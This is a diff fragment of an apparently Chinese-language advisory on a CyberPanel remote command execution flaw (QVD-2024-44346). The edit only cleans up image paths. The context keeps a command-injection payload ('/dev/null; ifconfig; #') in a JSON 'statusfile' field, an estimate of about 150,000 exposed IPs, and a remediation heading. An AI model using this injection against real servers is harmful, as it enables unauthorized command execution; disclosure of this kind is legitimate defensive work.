@@ -45,15 +45,15 @@ Connection: close
 
 {"statusfile":"/dev/null; ifconfig; #"}
 
-![image-20241028193933385](./.resource/Cyber​​Panelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028193933385.png)
+![image-20241028193933385](./.resource/CyberPanelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028193933385.png)
 
 
-![image-20241028194013546](./.resource/Cyber​​Panelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028194013546.png)
+![image-20241028194013546](./.resource/CyberPanelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028194013546.png)
 
 
 影响独立资产ip15万
 
-![image-20241028194118552](./.resource/Cyber​​Panelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028194118552.png)
+![image-20241028194118552](./.resource/CyberPanelupgrademysqlstatus远程命令执行漏洞QVD-2024-44346/media/image-20241028194118552.png)
 
 
 # 修复方案
